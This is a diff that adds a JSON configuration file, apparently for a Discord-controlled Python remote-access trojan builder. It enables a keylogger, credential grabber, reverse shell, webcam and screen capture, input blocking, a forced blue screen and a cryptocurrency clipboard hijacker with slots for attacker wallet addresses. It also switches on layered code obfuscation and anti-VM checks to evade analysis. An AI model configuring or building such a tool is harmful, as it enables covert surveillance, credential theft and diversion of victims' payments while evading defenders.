@@ -1,0 +1,101 @@
+{
+    "token": "",
+    "guild_ids": "",
+    "registry_name": "",
+    "directory_name": "",
+    "executable_name": "",
+    "implode_secret": "",
+    "icon_path": "",
+    "functionalities": {
+        "keylogr": true,
+        "scrnsht": false,
+        "f_manag": false,
+        "grabber": true,
+        "mc_live": true,
+        "mc_recc": true,
+        "process": true,
+        "rev_shl": true,
+        "webcam_": true,
+        "scrnrec": true,
+        "inputbl": true,
+        "bluesod": true,
+        "crclipr": true,
+        "messger": true,
+        "txtspee": false,
+        "audctrl": false,
+        "monctrl": true,
+        "webbloc": true,
+        "jmpscar": true,
+        "keystrk": true,
+        "scrnman": true
+    },
+    "obfuscation": {
+        "enabled": true,
+        "settings": {
+            "logicTransformer": true,
+            "removeTypeHints": true,
+            "fstrToFormatSeq": true,
+            "encodeStrings": [
+                true,
+                "b64lzma"
+            ],
+            "stringCollector": [
+                true,
+                -1,
+                512
+            ],
+            "floatsToComplex": true,
+            "intObfuscator": [
+                true,
+                "bits"
+            ],
+            "renamer": [
+                true,
+                "f'{kind}{get_counter(kind)}'"
+            ],
+            "typeAliasTransformer": [
+                true,
+                [
+                    "str",
+                    "int",
+                    "float",
+                    "filter",
+                    "bool",
+                    "bytes",
+                    "map",
+                    "range"
+                ]
+            ],
+            "replaceAttribSet": true,
+            "dynamicCodeObjLauncher": true,
+            "varCollector": true,
+            "unicodeTransformer": true,
+            "compileFinalFiles": true,
+            "packInPyz": [
+                true,
+                "__main__.py",
+                true
+            ]
+        }
+    },
+    "anti_vm": {
+        "enabled": true,
+        "FilesCheck": true,
+        "ProcessesCheck": true,
+        "HardwareIDsCheck": true,
+        "MacAddressesCheck": true
+    },
+    "crypto_clipper": {
+        "BTC": "",
+        "ETH": "",
+        "DOGE": "",
+        "LTC": "",
+        "XMR": "",
+        "BCH": "",
+        "DASH": "",
+        "TRX": "",
+        "XRP": "",
+        "XLM": ""
+    },
+    "debug_mode": false
+}
